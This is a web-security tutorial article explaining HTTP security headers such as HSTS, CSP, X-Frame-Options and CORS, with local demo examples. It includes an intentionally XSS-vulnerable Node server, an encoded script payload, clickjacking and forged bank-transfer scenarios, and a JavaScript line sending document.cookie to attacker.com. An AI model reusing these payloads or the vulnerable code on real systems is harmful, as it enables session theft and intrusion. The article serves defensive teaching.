---
card: "https://cdn-media-1.freecodecamp.org/images/1*w0YcpMhPGBRBeQ25G9g-iA.jpeg"
tags: [JavaScript]
description: by Alex Nadalin
author: "Milad E. Fahmy"
title: "Secure your web application with these HTTP headers"
created: "2021-08-15T19:41:35+02:00"
modified: "2021-08-15T19:41:35+02:00"
---
<div class="site-wrapper">
<main id="site-main" class="site-main outer">
<div class="inner">
<article class="post-full post tag-javascript tag-web-security tag-security tag-https tag-tech ">
<header class="post-full-header">
<h1 class="post-full-title">Secure your web application with these HTTP headers</h1>
</header>
<figure class="post-full-image">
<picture>
<source media="(max-width: 700px)" sizes="1px" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 1w">
<source media="(min-width: 701px)" sizes="(max-width: 800px) 400px,
(max-width: 1170px) 700px,
1400px" srcset="https://cdn-media-1.freecodecamp.org/images/1*w0YcpMhPGBRBeQ25G9g-iA.jpeg 300w,
https://cdn-media-1.freecodecamp.org/images/1*w0YcpMhPGBRBeQ25G9g-iA.jpeg 600w,
https://cdn-media-1.freecodecamp.org/images/1*w0YcpMhPGBRBeQ25G9g-iA.jpeg 1000w,
https://cdn-media-1.freecodecamp.org/images/1*w0YcpMhPGBRBeQ25G9g-iA.jpeg 2000w">
<img onerror="this.style.display='none'" src="https://cdn-media-1.freecodecamp.org/images/1*w0YcpMhPGBRBeQ25G9g-iA.jpeg" alt="Secure your web application with these HTTP headers">
</picture>
</figure>
<section class="post-full-content">
<div class="post-content medium-migrated-article">
<p>by Alex Nadalin</p>
<h1 id="secure-your-web-application-with-these-http-headers">Secure your web application with these HTTP headers</h1>
<figcaption>Photo by <a href="https://unsplash.com/photos/cPF2nlWcMY4?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener" target="_blank" title="">Daniel Cheung</a> on <a href="https://unsplash.com/search/photos/stormtrooper?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener" target="_blank" title="">Unsplash</a></figcaption>
</figure>
<p><em>This is part 3 of a series on web security: part 2 was “<a href="https://medium.freecodecamp.org/web-security-https-perspective-5fa07140f9b3" rel="noopener">Web Security: an introduction to HTTP</a>”</em></p>
<p>As we’ve seen in the previous parts of this series, servers can send HTTP headers to provide the client additional metadata around the response, besides sending the content that the client requested. Clients are then allowed to specify how a particular resource should be read, cached or secured.</p>
<p>There’s currently a very large spectrum of security-related headers that have been implemented by browsers in order to make it harder for attackers to take advantage of vulnerabilities. The next paragraphs try to summarize each and every one of them by explaining how they’re used, what kind of attacks they prevent, and a bit of history behind each header.</p>
<h4 id="http-strict-transport-security-hsts-">HTTP Strict Transport Security (HSTS)</h4>
<p>Since late 2012, HTTPS-everywhere believers have found it easier to force a client to always use the secure version of the HTTP protocol, thanks to <em>HTTP Strict Transport Security</em>: a very simple <code>Strict-Transport-Security: max-age=3600</code> will tell the browser that for the next hour (3600 seconds) it should not interact with the application with insecure protocols.</p>
<p>When a user tries to access an application secured by HSTS through HTTP, the browser will simply refuse to go ahead, automatically converting <code>http://</code> URLs to <code><a href="https://." rel="noopener">https://</a></code><a href="https://." rel="noopener">.</a></p>
<p>You can test this locally with the code at <a href="https://github.com/odino/wasec/tree/master/hsts" rel="noopener">github.com/odino/wasec/tree/master/hsts</a>. You will need to follow the instructions in the README (they involve installing a trusted SSL certificate for <code>localhost</code> on your machine, through the amazing <a href="https://github.com/FiloSottile/mkcert" rel="noopener">mkcert</a> tool) and then try opening <code>https://localhost:7889</code>.</p>
<p>There are 2 servers in this example, an HTTPS one listening on <code>7889</code>, and an HTTP one on port <code>7888</code>. When you access the HTTPS server, it will always try to redirect you to the HTTP version, which will work since there is no HSTS policy on the HTTPS server. If you instead add the <code>hsts=on</code> parameter in your URL, the browser will forcefully convert the link in the redirect to its <code>https://</code> version. Since the server at <code>7888</code> is http-only, you will end up staring at a page that looks more or less like this. ?</p>
<p>You might be wondering what happens the first time a user visits your website, as there is no HSTS policy defined beforehand: attackers could potentially trick the user to the <code>http://</code> version of your website and perpetrate their attack there, so there’s still room for problems. That’s a valid concern, as HSTS is a <em>trust on first use</em> mechanism. What it tries to do is to make sure that, once you’ve visited a website, the browser knows that subsequent interaction must use HTTPS.</p>
<p>A way around this shortcoming would be to maintain a huge database of websites that enforce HSTS, something that Chrome does through <a href="https://hstspreload.org/" rel="noopener">hstspreload.org</a>. You must first set your policy, then visit the website and check whether it’s eligible to be added to the database. For example, we can see Facebook made the list.</p>
<p>By submitting your website to this list, you can tell browsers in advance that your site uses HSTS, so that even the first interaction between clients and your server will be over a secure channel. But this comes at a cost, as you really need to commit to HSTS. If, by any chance, you’d like your website to be removed from the list that’s no easy task for browser vendors:</p>
<blockquote>Be aware that inclusion in the preload list cannot easily be undone.</blockquote>
<blockquote>Domains can be removed, but it takes months for a change to reach users with a Chrome update and we cannot make guarantees about other browsers. Don’t request inclusion unless you’re sure that you can support HTTPS for your entire site and all its subdomains for the long term.</blockquote>
<blockquote>Source: <a href="https://hstspreload.org/" rel="noopener">https://hstspreload.org/</a></blockquote>
<p>This happens because the vendor cannot guarantee that all users will be on the latest version of their browser, with your site removed from the list. Think carefully, and make a decision based on your degree of confidence in HSTS and your ability to support it on the long run.</p>
<h3 id="http-public-key-pinning-hpkp-">HTTP Public Key Pinning (HPKP)</h3>
<p>HTTP Public Key Pinning is a mechanism that allows us to advertise to the browser which SSL certificates to expect whenever it connects to our servers. It is a <em>trust on first use</em> header, just like HSTS, meaning that, once the client connects to our server, it will store the certificate’s info for subsequent interactions. If, at any point in time, the client detects that another certificate is being used by the server, it will politely refuse to connect, rendering <em>man in the middle</em> (MITM) attacks very hard to pull off.</p>
<p>This is how a HPKP policy looks like:</p><pre><code>Public-Key-Pins:  pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu=";  pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3=";  max-age=3600; includeSubDomains;  report-uri="https://pkpviolations.example.org/collect"</code></pre>
<p>The header advertises what certificates the server will use (in this case it’s two of them) using a hash of the certificates, and includes additional information such as the time-to-live of this directive (<code>max-age=3600</code>), and a few other details. Sadly, there’s no point in digging deeper to understand what we can do with public key pinning, as <a href="https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/he9tr7p3rZ8/eNMwKPmUBAAJ" rel="noopener">this feature is being deprecated by Chrome</a> - a signal that its adoption is destined to plummet very soon.</p>
<p>Chrome’s decision is not irrational, but simply a consequence of the risks associated with public key pinning. If you lose your certificate, or simply make a mistake while testing, your website will be inaccessible to users that have visited the website earlier (for the duration of the <code>max-age</code> directive, which is typically weeks or months).</p>
<p>As a result of these potentially catastrophic consequences, adoption of HPKP has been extremely low, and there have been incidents where <a href="https://www.smashingmagazine.com/be-afraid-of-public-key-pinning/" rel="noopener">big-time websites have been unavailable</a> because of a misconfiguration. All considered, Chrome decided users were better off without the protection offered by HPKP - and <a href="https://scotthelme.co.uk/im-giving-up-on-hpkp/" rel="noopener">security researchers aren’t entirely against this decision</a>.</p>
<h3 id="expect-ct">Expect-CT</h3>
<p>While HPKP has been deprecated, a new header stepped in to prevent fraudulent SSL certificates from being served to clients: <code>Expect-CT</code>.</p>
<p>The goal of this header is to inform the browser that it should perform additional “background checks” to ensure the certificate is genuine: when a server uses the <code>Expect-CT</code> header, it is fundamentally requesting the client to verify that the certificates being used are present in public Certificate Transparency (CT) logs.</p>
<p>The Certificate Transparency initiative is an effort led by Google in order to provide:</p>
<blockquote>An open framework for monitoring and auditing SSL certificates in nearly real time.</blockquote>
<blockquote>Specifically, Certificate Transparency makes it possible to detect SSL certificates that have been mistakenly issued by a certificate authority or maliciously acquired from an otherwise unimpeachable certificate authority. It also makes it possible to identify certificate authorities that have gone rogue and are maliciously issuing certificates.</blockquote>
<blockquote><em>Source: <a href="https://www.certificate-transparency.org/" rel="noopener">https://www.certificate-transparency.org/</a></em></blockquote>
<p>The header takes this form:</p><pre><code>Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"</code></pre>
<p>In this example, the server is asking the browser to:</p>
<ul>
<li>enable CT verification for the current app for a period of 1 hour (3600 seconds)</li>
<li><code>enforce</code> this policy and prevent access to the app if a violation occurs</li>
<li>send a report to the given URL if a violation occurs</li>
</ul>
<p>The Certificate Transparency initiative’s goal is to detect mis-issued or malicious certificates (and rogue Certificate Authorities) earlier, faster, and more precisely than any other method used before.</p>
<p>By opting-in using the <code>Expect-CT</code> header, you can take advantage of this initiative to improve your app’s security posture.</p>
<h3 id="x-frame-options">X-Frame-Options</h3>
<p>Imagine seeing a web page such as this popping in front of your screen:</p>
<p>As soon as you click on the link, you realize that all the money in your bank account is gone. What happened?</p>
<p>You were a victim of a <em>clickjacking</em> attack.</p>
<p>An attacker directed you to their website, which displays a very attractive link to click. Unfortunately, he also embedded in the page an iframe from <code>your-bank.com/transfer?amount=-1&amp;<a href="https://odino.org/cdn-cgi/l/email-protection" rel="noopener">[attacker@gmail.com]</a></code> but hid it by setting it’s opacity to 0%. What then happened is that thought of clicking on the original page, trying to win a brand-new hummer, but instead the browser captured a click on the iframe, a dangerous click that confirmed the transfer of money.</p>
<p>Most banking systems require you to specify a one-time PIN code to confirm transactions, but your bank didn’t catch up with times and all of your money is gone.</p>
<p>The example is pretty extreme but should let you understand what could be the consequences of a <a href="https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/" rel="noopener">clickjacking attack</a>. The user intends to click on a particular link, while the browser will trigger a click on the “invisible” page that’s been embedded as an iframe.</p>
<p>I have included an example of this vulnerability at <a href="https://github.com/odino/wasec/tree/master/clickjacking" rel="noopener">github.com/odino/wasec/tree/master/clickjacking</a>. If you run the example and try clicking on the “appealing” link, you will see the actual click is intercepted by the iframe, which increases its opacity so that’s easier for you to spot the problem. The example should be accessible at <code><a href="http://localhost:7888:" rel="noopener">http://localhost:7888</a></code>.</p>
<p>Luckily, browsers have come up with a simple solution to the problem: <code>X-Frame-Options</code> (XFO) which lets you decide whether your app can be embedded as an iframe on external websites. Popularized by Internet Explorer 8, XFO was first introduced in 2009 and is still supported by all major browsers.</p>
<p>The way it works is, when a browser sees an iframe, it loads it and verifies that its XFO allows its inclusion in the current page before rendering it.</p>
<p>The supported values are:</p>
<ul>
<li><code>DENY</code>: this web page cannot be embedded anywhere. This is the highest level of protection as it doesn’t allow anyone to embed our content.</li>
<li><code>SAMEORIGIN</code>: only pages from the same domain as the current one can embed this page. This means that <code>example.com/embedder</code> can load <code>example.com/embedded</code> so long as its policy is set to <code>SAMEORIGIN</code>. This is a more relaxed policy that allows owners of a particular website to embed their own pages across their application.</li>
<li><code>ALLOW-FROM uri</code>: embedding is allowed from the specified URI. We could, for example, let an external, authorized website embed our content by using <code>ALLOW-FROM https://external.com</code>. This is generally used when you intend to allow a 3rd party to embed your content through an iframe</li>
</ul>
<p>An example HTTP response that includes the strictest XFO policy possible looks like:</p><pre><code>HTTP/1.1 200 OKContent-Type: application/jsonX-Frame-Options: DENY</code></pre><pre><code>...</code></pre>
<p>In order to showcase how browsers behave when XFO is enabled, we can simply change the URL of our example to <code>http://localhost:7888/?xfo=on</code>. The <code>xfo=on</code> parameter tells the server to include <code>X-Frame-Options: deny</code> in the response, and we can see how the browser restricts access to the iframe:</p>
<p>XFO was considered the best way to prevent frame-based clickjacking attacks until another header came into play years later, Content Security Policy or CSP for short.</p>
<h3 id="content-security-policy-csp-">Content Security Policy (CSP)</h3>
<p>The <code>Content-Security-Policy</code> header, often abbreviated to CSP, provides a next-generation utility belt for preventing a plethora of attacks, ranging from XSS (Cross-site Scripting) to clickjacking.</p>
<p>To understand how CSP helps us, we should first think of an attack vector. Let’s say we just built our own Google Search, a simple input text with a submit button.</p>
<p>This web application does nothing magical. It just,</p>
<ul>
<li>displays a form</li>
<li>lets the user execute a search</li>
<li>displays the search results alongside with the keyword the user searched for</li>
</ul>
<p>When we execute a simple search, this is what the application returns:</p>
<p>Amazing! Our application incredibly understood our search and found a related image. If we dig deeper in the source code, available at <a href="https://github.com/odino/wasec/tree/master/xss" rel="noopener">github.com/odino/wasec/tree/master/xss</a>, we will soon realize that the application presents a security issue, as whatever keyword the user searches for is directly printed in the HTML response served to the client:</p><pre><code>var qs = require('querystring')var url = require('url')var fs = require('fs')</code></pre><pre><code>require('http').createServer((req, res) =&gt; {  let query = qs.parse(url.parse(req.url).query)  let keyword = query.search || ''  let results = keyword ? `You searched for "${keyword}", we found:&lt;/br&gt;&amp;lt;img src="http://placekitten.com/200/300" /&gt;` : `Try searching...`</code></pre><pre><code>res.end(fs.readFileSync(__dirname + '/index.html').toString().replace('__KEYWORD__', keyword).replace('__RESULTS__', results))}).listen(7888)</code></pre><pre><code>&lt;html&gt;  &lt;body&gt;    &lt;h1&gt;Search The Web&lt;/h1&gt;    &lt;form&gt;      &lt;input type="text" name="search" value="__KEYWORD__" /&gt;      &lt;input type="submit" /&gt;    &lt;/form&gt;    &lt;div id="results"&gt;      __RESULTS__    &lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre>
<p>This presents a nasty consequence. An attacker can craft a specific link that executes arbitrary JavaScript within the victims browser.</p>
<p>If you have the time and patience to run the example locally, you will be able to quickly understand the power of CSP. I’ve added a query string parameter that turns CSP on, so we can try navigating to a malicious URL with CSP turned on:</p><pre><code>http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on</code></pre>
<p>As you see in the example above, we have told the browser that our CSP policy only allows scripts included from the same origin of the current URL, which we can easily verify by curling the URL and viewing the response header:</p><pre><code>$ curl -I "http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on"</code></pre><pre><code>HTTP/1.1 200 OKX-XSS-Protection: 0Content-Security-Policy: default-src 'self'Date: Sat, 11 Aug 2018 10:46:27 GMTConnection: keep-alive</code></pre>
<p>Since the XSS attack was perpetrated through an <em>inline script</em> (a script directly embedded in the HTML content), the browser politely refused to execute it, keeping our user safe. Imagine if, instead of simply displaying an alert dialog, the attacker would have set up a redirect to its own domain, through some JavaScript code that could look like:</p><pre><code>window.location = `attacker.com/${document.cookie}`</code></pre>
<p>They would have been able to steal all of the user’s cookies, which might contain highly sensitive data (more on this in the next article).</p>
<p>By now, it should be clear how CSP helps us prevent a range of attacks on web applications. You define a policy and the browser will strictly adhere to it, refusing to run resources that would violate the policy.</p>
<p>An interesting variation of CSP is the <em>report-only</em> mode. Instead of using the <code>Content-Security-Policy</code> header, you can first test the impact of CSP on your website by telling the browser to simply report errors, without blocking script execution and so on, by using the <code>Content-Security-Policy-Report-Only</code> header.</p>
<p>Reporting will allow you to understand what breaking changes the CSP policy you’d like to roll out might cause, and fix them accordingly. We can even specify a report URL and the browser will send us a report. Here’s a full example of a report-only policy:</p><pre><code>Content-Security-Policy: default-src 'self'; report-uri http://cspviolations.example.com/collector</code></pre>
<p>CSP policies can be a bit complex on their own, such as in the following example:</p><pre><code>Content-Security-Policy: default-src 'self'; script-src scripts.example.com; img-src *; media-src medias.example.com medias.legacy.example.com</code></pre>
<p>This policy defines the following rules:</p>
<ul>
<li>executable scripts (eg. JavaScript) can only be loaded from <code>scripts.example.com</code></li>
<li>images may be loaded from any origin (<code>img-src: *</code>)</li>
<li>video or audio content can be loaded from two origins: <code>medias.example.com</code> and <code>medias.legacy.example.com</code></li>
</ul>
<p>As you can see, policies can become lengthy, and if we want to ensure the highest protection for our users this can become quite a tedious process. Nevertheless, writing a comprehensive CSP policy is an important step towards adding an additional layer of security to our web applications.</p>
<p>For more information around CSP I would recommend a deep dive at <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="noopener">developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a>.</p>
<h3 id="x-xss-protection">X-XSS-Protection</h3>
<p>Although superseded by CSP, the <code>X-XSS-Protection</code> header provides a similar type of protection. This header is used to mitigate XSS attacks in older browsers that don’t fully support CSP. This header is not supported by Firefox.</p>
<p>Its syntax is very similar to what we’ve just seen:</p><pre><code>X-XSS-Protection: 1; report=http://xssviolations.example.com/collector</code></pre>
<p>Reflected XSS is the most common type of attack, where an unsanitized input gets printed by the server without any validation, and it’s where this header truly shines. If you want to see this yourself, I would recommend to try out the example at <a href="https://github.com/odino/wasec/tree/master/xss" rel="noopener">github.com/odino/wasec/tree/master/xss</a> as, by appending <code>xss=on</code> to the URL, it shows what a browser does when XSS protection is turned on. If we enter a malicious string in our search box, such as <code>&lt;script&gt;alert('hello')&lt;</code>;/script&gt;, the browser will politely refuse to execute the script, and explain the reasoning behind its decision:</p><pre><code>The XSS Auditor refused to execute a script in'http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=on'because its source code was found within the request.The server sent an 'X-XSS-Protection' header requesting this behavior.</code></pre>
<p>Even more interesting is Chrome’s default behavior when the webpage does not specify any CSP or XSS policy, a scenario we can test by adding the <code>xss=off</code> parameter to our URL (<code>http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=off</code>):</p>
<p>Amazing, Chrome’s cautious enough that it will prevent the page from rendering, making reflected XSS very difficult to pull off. It’s impressive to see how far browsers have come.</p>
<h3 id="feature-policy">Feature policy</h3>
<p>In July 2018, security researcher <a href="https://scotthelme.co.uk/" rel="noopener">Scott Helme</a> published a very interesting <a href="https://scotthelme.co.uk/a-new-security-header-feature-policy/" rel="noopener">blog post</a> detailing a new security header in the making: <code>Feature-Policy</code>.</p>
<p>Currently supported by very few browsers (Chrome and Safari at the time of this writing), this header lets us define whether a specific browser feature is enabled within the current page. With a syntax very similar to CSP, we should have no issue understanding what a feature policy such as the following one means:</p><pre><code>Feature-Policy: vibrate 'self'; push *; camera 'none'</code></pre>
<p>If we still have a few doubts about how this policy impacts the browser APIs available to the page, we can simply dissect it:</p>
<ul>
<li><code>vibrate 'self'</code>: this will allow the current page to use the vibration API and any nested browsing contexts (iframes) on the same origin</li>
<li><code>push *</code>: the current page and any iframe can use the push notification API</li>
<li><code>camera 'none'</code>: access to the camera API is denied to the current page and any nested context (iframes)</li>
</ul>
<p>The feature policy might have a short history, but it doesn’t hurt to get a head start. If your website allows users to, for example, take a selfie or record audio, it would be quite beneficial to use a policy that restricts other contexts from accessing the API through your page.</p>
<h3 id="x-content-type-options">X-Content-Type-Options</h3>
<p>Sometimes, clever browser features end up hurting us from a security standpoint. A clear example is MIME-sniffing, a technique popularized by Internet Explorer.</p>
<p>MIME-sniffing is the ability, for a browser, to auto-detect (and fix) the content type of a resource it is downloading. For example, we ask the browser to render an image at <code>/awesome-picture.png</code>, but the server sets the wrong type when serving it to the browser (for example, <code>Content-Type: text/plain</code>). This would generally result in the browser not being able to display the image properly.</p>
<p>In order to fix the issue, IE went to great lengths to implement a MIME-sniffing capability: when downloading a resource, the browser would “scan” it and, if it would detect that the resource’s content type is not the one advertised by the server in the <code>Content-Type</code> header, it would ignore the type sent by the server and interpret the resource according to the type detected by the browser.</p>
<p>Now, imagine hosting a website that allows users to upload their own images, and imagine a user uploading a <code>/test.jpg</code> file that contains JavaScript code. See where this is going? Once the file is uploaded, the site would include it in its own HTML and, when the browser would try to render the document, it would find the “image” the user just uploaded. As the browser downloads the image, it would detect that it’s a script instead, and execute it on the victim’s browser.</p>
<p>To avoid this issue, we can set the <code>X-Content-Type-Options: nosniff</code> header that completely disables MIME-sniffing: by doing so, we are telling the browser that we’re fully aware that some file might have a mismatch in terms of type and content, and the browser should not worry about it. We know what we’re doing, so the browser shouldn’t try to guess things, potentially posing a security threat to our users.</p>
<h3 id="cross-origin-resource-sharing-cors-">Cross-Origin Resource Sharing (CORS)</h3>
<p>On the browser, through JavaScript, HTTP requests can only be triggered across the same origin. Simply put, an AJAX request from <code>example.com</code> can only connect to <code>example.com</code>.</p>
<p>This is because your browser contains useful information for an attacker - cookies, which are generally used to keep track of the user’s session. Imagine if an attacker would set up a malicious page at <code>win-a-hummer.com</code> that immediately triggers an AJAX request to <code>your-bank.com</code>. If you’re logged in on the bank’s website, the attacker would then be able to execute HTTP requests with your credentials, potentially stealing information or, worse, wiping your bank account out.</p>
<p>There might be some cases, though, that require you to execute cross-origin AJAX requests, and that is the reason browsers implement Cross Origin Resource Sharing (CORS), a set of directives that allow you to execute cross-domain requests.</p>
<p>The mechanics behind CORS is quite complex, and it won’t be practical for us to go over the whole specification, so I am going to focus on a “stripped down” version of CORS.</p>
<p>All you need to know, for now, is that by using the <code>Access-Control-Allow-Origin</code> header, your application tells the browser that it’s ok to receive requests from other origins.</p>
<p>The most relaxed form of this header is <code>Access-Control-Allow-Origin: *</code>, which allows any origin to access our application, but we can restrict it by simply adding the URL we want to whitelist with <code>Access-Control-Allow-Origin: <a href="https://example.com." rel="noopener">https://example.com</a></code><a href="https://example.com." rel="noopener">.</a></p>
<p>If we take a look at the example at <a href="https://github.com/odino/wasec/tree/master/cors" rel="noopener">github.com/odino/wasec/tree/master/cors</a> we can clearly see how the browser prevents access to a resource on a separate origin. I have set up the example to make an AJAX request from <code>test-cors</code> to <code>test-cors-2</code>, and print the result of the operation to the browser. When the server behind <code>test-cors-2</code> is instructed to use CORS, the page works as you would expect. Try navigating to <code><a href="http://cors-test:7888/?cors=on:" rel="noopener">http://cors-test:7888/?cors=on</a></code></p>
<p>But when we remove the <code>cors</code> parameter from the URL, the browser intervenes and prevents us from accessing the content of the response:</p>
<p>An important aspect we need to understand is that the browser executed the request, but prevented the client from accessing it. This is extremely important, as it still leaves us vulnerable if our request would have triggered any side effect on the server. Imagine, for example, if our bank would allow the transfer of money by simply calling the url <code>my-bank.com/transfer?amount=1000&amp;from=me&amp;to=attacker</code>. That would be a disaster!</p>
<p>As we’ve seen at the beginning of this article, <code>GET</code> requests are supposed to be idempotent, but what would happen if we tried triggering a <code>POST</code> request? Luckily, I’ve included this scenario in the example, so we can try it by navigating to <code><a href="http://cors-test:7888/?method=POST:" rel="noopener">http://cors-test:7888/?method=POST</a></code><a href="http://cors-test:7888/?method=POST:" rel="noopener">:</a></p>
<p>Instead of directly executing our <code>POST</code> request, which could potentially cause some serious trouble on the server, the browser sent a “preflight” request. This is nothing but an <code>OPTIONS</code> request to the server, asking it to validate whether our origin is allowed. In this case, the server did not respond positively, so the browser stops the process, and our <code>POST</code> request never reaches the target.</p>
<p>This tells us a couple things:</p>
<ul>
<li>CORS is not a simple specification. There are quite a few scenarios to keep in mind and you can easily get tangled in the nuances of features such as preflight requests.</li>
<li>Never expose APIs that change state via <code>GET</code>. An attacker can trigger those requests without a preflight request, meaning there’s no protection at all</li>
</ul>
<p>Out of experience, I found myself more comfortable with setting up proxies that can forward the request to the right server, all on the backend, rather than using CORS. This means that your application running at <code>example.com</code> can setup a proxy at <code>example.com/_proxy/other.com</code>, so that all requests falling under <code>_proxy/other.com/*</code> get proxied to <code>other.com</code>.</p>
<p>I will conclude my overview of this feature here but, if you’re interested in understanding CORS in depth, MDN has a very lengthy article that brilliantly covers the whole specification at <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="noopener">developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a>.</p>
<h3 id="x-permitted-cross-domain-policies">X-Permitted-Cross-Domain-Policies</h3>
<p>Very much related to CORS, the <code>X-Permitted-Cross-Domain-Policies</code> targets cross domain policies for Adobe products (namely Flash and Acrobat).</p>
<p>I won’t go much into the details, as this is a header that targets very specific use cases. Long story short, Adobe products handle cross-domain request through a <code>crossdomain.xml</code> file in the root of the domain the request is targeting, and the <code>X-Permitted-Cross-Domain-Policies</code> defines policies to access this file.</p>
<p>Sounds complicated? I would simply suggest to add an <code>X-Permitted-Cross-Domain-Policies: none</code> and ignore clients wanting to make cross-domain requests with Flash.</p>
<h3 id="referrer-policy">Referrer-Policy</h3>
<p>At the beginning of our careers, we all probably made the same mistake. Use the <code>Referer</code> header to implement a security restriction on our website. If the header contains a specific URL in a whitelist we define, we’re going to let users through.</p>
<p>Ok, maybe that wasn’t every one of us. But I damn sure made this mistake back then. Trusting the <code>Referer</code> header to give us reliable information on the origin the user comes from. The header was really useful until we figured that sending this information to sites could pose a potential threat to our users’ privacy.</p>
<p>Born at the beginning of 2017 and currently supported by all major browsers, the <code>Referrer-Policy</code> header can be used to mitigate these privacy concerns by telling the browser that it should only mask the URL in the <code>Referer</code> header, or omit it altogether.</p>
<p>Some of the most common values the <code>Referrer-Policy</code> can take are:</p>
<ul>
<li><code>no-referrer</code>: the <code>Referer</code> header will be entirely omitted</li>
<li><code>origin</code>: turns <code>https://example.com/private-page</code> to <code><a href="https://example.com/" rel="noopener">https://example.com/</a></code></li>
<li><code>same-origin</code>: send the <code>Referer</code> to same-site origins but omit it for anyone else</li>
</ul>
<p>It’s worth noting that there are a lot more variations of the <code>Referrer-Policy</code> (<code>strict-origin</code>, <code>no-referrer-when-downgrade</code>, etc) but the ones I mentioned above are probably going to cover most of your use cases. If you wish to better understand each and every variation you can use, I would recommend heading to the <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#rp" rel="noopener">OWASP dedicated page</a>.</p>
<p>The <code>Origin</code> header is very similar to the <code>Referer</code>, as it’s sent by the browser in cross-domain requests to make sure the caller is allowed to access a resource on a different domain. The <code>Origin</code> header is controlled by the browser, so there’s no way malicious users can tamper with it. You might be tempted to use it as a firewall for your web application: if the <code>Origin</code> is in our whitelist, let the request go through.</p>
<p>One thing to consider, though, is that other HTTP clients such as cURL can present their own origin: a simple <code>curl -H "Origin: example.com" api.example.com</code> will render all origin-based firewall rules inefficient… …and that is why you cannot rely on the <code>Origin</code> (or the <code>Referer</code>, as we’ve just seen) to build a firewall to keep malicious clients away.</p>
<h3 id="testing-your-security-posture">Testing your security posture</h3>
<p>I want to conclude this article with a reference to <a href="https://securityheaders.com/" rel="noopener">securityheaders.com</a>, an incredibly useful website that allows you to verify that your web application has the right security-related headers in place. After you submit a URL, you will be handed a grade and a breakdown, header by header. Here’s an <a href="https://securityheaders.com/?q=https%3A%2F%2Ffacebook.com&amp;followRedirects=on" rel="noopener">example report for facebook.com</a>:</p>
<p>If in doubt on where to start, securityheaders.com is a great place to get a first assessment.</p>
<h3 id="stateful-http-managing-sessions-with-cookies">Stateful HTTP: managing sessions with cookies</h3>
<p>This article should have introduced us to a few interesting HTTP headers, allowing us to understand how they harden our web applications through protocol-specific features, together with a bit of help from mainstream browsers.</p>
<p>In the <a href="https://medium.freecodecamp.org/web-security-hardening-http-cookies-be8d8d8016e1" rel="noopener">next post</a>, we will delve deep into one of the most misunderstood features of the HTTP protocol: cookies.</p>
<p>Born to bring some sort of state to the otherwise stateless HTTP, cookies have probably been used (and misused) by each and everyone of us in order to support sessions in our web apps: whenever there’s some state we’d like to persist it’s always easy to say “store it in a cookie”. As we will see, cookies are not always the safest of vaults and must be treated carefully when dealing with sensitive information.</p>
<p><em>Originally published at <a href="https://odino.org/secure-your-web-application-with-these-http-headers/" rel="noopener">odino.org</a> (23 August 2018).</em><br><em>You can follow me on <a href="https://twitter.com/_odino_" rel="noopener">Twitter</a> — rants are welcome! </em>?</p>
</div>
<hr>
</section>
</article>
</div>
</main>
</div>
<!-- Google Tag Manager (noscript) -->
<!-- End Google Tag Manager (noscript) -->
